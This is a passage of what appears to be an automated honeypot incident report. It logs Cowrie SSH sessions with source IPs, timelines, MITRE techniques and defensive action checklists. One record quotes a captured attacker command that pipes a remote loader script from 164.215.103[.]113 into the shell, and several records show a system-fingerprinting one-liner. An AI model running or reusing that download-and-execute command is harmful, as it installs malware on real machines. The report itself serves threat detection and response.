| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:55:56` | `cowrie.session.connect` |
| `2026-07-24 03:55:56` | `cowrie.client.version` |
| `2026-07-24 03:55:56` | `cowrie.client.kex` |
| `2026-07-24 03:55:59` | `cowrie.login.success` |
| `2026-07-24 03:56:01` | `cowrie.session.params` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.success` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.command.input` |
| `2026-07-24 03:56:01` | `cowrie.log.closed` |
| `2026-07-24 03:56:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0eb186a36fdb

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]174` |
| **First Seen** | 2026-07-24 03:56 |
| **Last Seen** | 2026-07-24 03:58 |
| **Session Duration** | 106s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `su, shell, uname -a, cd /var/run || cd /mnt || cd /root || cd /; wget -qO- hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh | sh -s 164.215.103[.]113` |
| **Download Attempts** | hxxp://164.215.103[.]113:6996/pikujyhtcxz/loader.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:56:41` | `cowrie.session.connect` |
| `2026-07-24 03:56:42` | `cowrie.login.success` |
| `2026-07-24 03:56:43` | `cowrie.session.params` |
| `2026-07-24 03:56:43` | `cowrie.command.input` |
| `2026-07-24 03:56:45` | `cowrie.command.input` |
| `2026-07-24 03:56:45` | `cowrie.command.failed` |
| `2026-07-24 03:56:45` | `cowrie.command.input` |
| `2026-07-24 03:56:47` | `cowrie.command.input` |
| `2026-07-24 03:56:47` | `cowrie.session.file_download` |
| `2026-07-24 03:58:27` | `cowrie.log.closed` |
| `2026-07-24 03:58:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]174` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21fcfb81db93

| Field | Detail |
|---|---|
| **Source IP** | `36.154.134[.]146` |
| **First Seen** | 2026-07-24 03:56 |
| **Last Seen** | 2026-07-24 03:57 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:56:57` | `cowrie.session.connect` |
| `2026-07-24 03:56:58` | `cowrie.client.version` |
| `2026-07-24 03:56:58` | `cowrie.client.kex` |
| `2026-07-24 03:57:00` | `cowrie.login.success` |
| `2026-07-24 03:57:01` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.154.134[.]146` to AbuseIPDB if not already reported
- [ ] Block `36.154.134[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1193002bc46

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:57 |
| **Last Seen** | 2026-07-24 03:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:57:40` | `cowrie.session.connect` |
| `2026-07-24 03:57:41` | `cowrie.client.version` |
| `2026-07-24 03:57:41` | `cowrie.client.kex` |
| `2026-07-24 03:57:43` | `cowrie.login.success` |
| `2026-07-24 03:57:45` | `cowrie.session.params` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.success` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.command.input` |
| `2026-07-24 03:57:45` | `cowrie.log.closed` |
| `2026-07-24 03:57:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373759148a3f

| Field | Detail |
|---|---|
| **Source IP** | `120.194.50[.]39` |
| **First Seen** | 2026-07-24 03:58 |
| **Last Seen** | 2026-07-24 03:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:58:25` | `cowrie.session.connect` |
| `2026-07-24 03:58:25` | `cowrie.client.version` |
| `2026-07-24 03:58:25` | `cowrie.client.kex` |
| `2026-07-24 03:58:27` | `cowrie.login.success` |
| `2026-07-24 03:58:28` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:58:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.194.50[.]39` to AbuseIPDB if not already reported
- [ ] Block `120.194.50[.]39` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19f343bc4477

| Field | Detail |
|---|---|
| **Source IP** | `181.212.174[.]166` |
| **First Seen** | 2026-07-24 03:58 |
| **Last Seen** | 2026-07-24 03:58 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:58:33` | `cowrie.session.connect` |
| `2026-07-24 03:58:33` | `cowrie.client.version` |
| `2026-07-24 03:58:33` | `cowrie.client.kex` |
| `2026-07-24 03:58:35` | `cowrie.login.success` |
| `2026-07-24 03:58:35` | `cowrie.direct-tcpip.request` |
| `2026-07-24 03:58:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c93cf2f20297

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 03:59 |
| **Last Seen** | 2026-07-24 03:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 03:59:24` | `cowrie.session.connect` |
| `2026-07-24 03:59:25` | `cowrie.client.version` |
| `2026-07-24 03:59:25` | `cowrie.client.kex` |
| `2026-07-24 03:59:27` | `cowrie.login.success` |
| `2026-07-24 03:59:28` | `cowrie.session.params` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.success` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:28` | `cowrie.command.input` |
| `2026-07-24 03:59:29` | `cowrie.log.closed` |
| `2026-07-24 03:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd282d7427f1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 04:01 |
| **Last Seen** | 2026-07-24 04:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:01:16` | `cowrie.session.connect` |
| `2026-07-24 04:01:17` | `cowrie.client.version` |
| `2026-07-24 04:01:17` | `cowrie.client.kex` |
| `2026-07-24 04:01:18` | `cowrie.login.success` |
| `2026-07-24 04:01:20` | `cowrie.session.params` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.success` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.command.input` |
| `2026-07-24 04:01:20` | `cowrie.log.closed` |
| `2026-07-24 04:01:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08738d5d70a3

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 04:03 |
| **Last Seen** | 2026-07-24 04:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:03:12` | `cowrie.session.connect` |
| `2026-07-24 04:03:13` | `cowrie.client.version` |
| `2026-07-24 04:03:13` | `cowrie.client.kex` |
| `2026-07-24 04:03:14` | `cowrie.login.success` |
| `2026-07-24 04:03:16` | `cowrie.session.params` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.success` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.command.input` |
| `2026-07-24 04:03:16` | `cowrie.log.closed` |
| `2026-07-24 04:03:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e76d83ee425

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 04:05 |
| **Last Seen** | 2026-07-24 04:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:05:12` | `cowrie.session.connect` |
| `2026-07-24 04:05:12` | `cowrie.client.version` |
| `2026-07-24 04:05:12` | `cowrie.client.kex` |
| `2026-07-24 04:05:13` | `cowrie.login.success` |
| `2026-07-24 04:05:15` | `cowrie.session.params` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.success` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.command.input` |
| `2026-07-24 04:05:15` | `cowrie.log.closed` |
| `2026-07-24 04:05:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c2439339a1b

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:06 |
| **Last Seen** | 2026-07-24 04:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:06:29` | `cowrie.session.connect` |
| `2026-07-24 04:06:29` | `cowrie.client.version` |
| `2026-07-24 04:06:29` | `cowrie.client.kex` |
| `2026-07-24 04:06:29` | `cowrie.login.success` |
| `2026-07-24 04:06:30` | `cowrie.session.params` |
| `2026-07-24 04:06:30` | `cowrie.command.input` |
| `2026-07-24 04:06:30` | `cowrie.log.closed` |
| `2026-07-24 04:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de2fdf4bcb2e

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-24 04:07 |
| **Last Seen** | 2026-07-24 04:07 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:07:23` | `cowrie.session.connect` |
| `2026-07-24 04:07:23` | `cowrie.client.version` |
| `2026-07-24 04:07:23` | `cowrie.client.kex` |
| `2026-07-24 04:07:24` | `cowrie.login.success` |
| `2026-07-24 04:07:25` | `cowrie.session.params` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.success` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.command.input` |
| `2026-07-24 04:07:25` | `cowrie.log.closed` |
| `2026-07-24 04:07:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f39687e43c

| Field | Detail |
|---|---|
| **Source IP** | `61.184.128[.]210` |
| **First Seen** | 2026-07-24 04:07 |
| **Last Seen** | 2026-07-24 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:07:35` | `cowrie.session.connect` |
| `2026-07-24 04:07:36` | `cowrie.client.version` |
| `2026-07-24 04:07:36` | `cowrie.client.kex` |
| `2026-07-24 04:07:38` | `cowrie.login.success` |
| `2026-07-24 04:07:38` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:07:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.184.128[.]210` to AbuseIPDB if not already reported
- [ ] Block `61.184.128[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f751a2877215

| Field | Detail |
|---|---|
| **Source IP** | `49.124.152[.]254` |
| **First Seen** | 2026-07-24 04:07 |
| **Last Seen** | 2026-07-24 04:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:07:37` | `cowrie.session.connect` |
| `2026-07-24 04:07:38` | `cowrie.client.version` |
| `2026-07-24 04:07:38` | `cowrie.client.kex` |
| `2026-07-24 04:07:40` | `cowrie.login.success` |
| `2026-07-24 04:07:41` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.152[.]254` to AbuseIPDB if not already reported
- [ ] Block `49.124.152[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-339e0e01514c

| Field | Detail |
|---|---|
| **Source IP** | `188.43.204[.]45` |
| **First Seen** | 2026-07-24 04:07 |
| **Last Seen** | 2026-07-24 04:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:07:50` | `cowrie.session.connect` |
| `2026-07-24 04:07:50` | `cowrie.client.version` |
| `2026-07-24 04:07:50` | `cowrie.client.kex` |
| `2026-07-24 04:07:51` | `cowrie.login.success` |
| `2026-07-24 04:07:52` | `cowrie.direct-tcpip.request` |
| `2026-07-24 04:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.43.204[.]45` to AbuseIPDB if not already reported
- [ ] Block `188.43.204[.]45` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20db28d1e308

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:08 |
| **Last Seen** | 2026-07-24 04:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:08:16` | `cowrie.session.connect` |
| `2026-07-24 04:08:16` | `cowrie.client.version` |
| `2026-07-24 04:08:16` | `cowrie.client.kex` |
| `2026-07-24 04:08:16` | `cowrie.login.success` |
| `2026-07-24 04:08:17` | `cowrie.session.params` |
| `2026-07-24 04:08:17` | `cowrie.command.input` |
| `2026-07-24 04:08:17` | `cowrie.log.closed` |
| `2026-07-24 04:08:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d0b0589e5ec

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-07-24 04:09 |
| **Last Seen** | 2026-07-24 04:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:09:59` | `cowrie.session.connect` |
| `2026-07-24 04:09:59` | `cowrie.client.version` |
| `2026-07-24 04:09:59` | `cowrie.client.kex` |
| `2026-07-24 04:10:00` | `cowrie.login.success` |
| `2026-07-24 04:10:00` | `cowrie.session.params` |
| `2026-07-24 04:10:00` | `cowrie.command.input` |
| `2026-07-24 04:10:00` | `cowrie.log.closed` |
| `2026-07-24 04:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c3deed8b4f2

| Field | Detail |
|---|---|
| **Source IP** | `72.24.210[.]58` |
| **First Seen** | 2026-07-24 04:10 |
| **Last Seen** | 2026-07-24 04:11 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-24 04:10:59` | `cowrie.session.connect` |
| `2026-07-24 04:10:59` | `cowrie.client.version` |
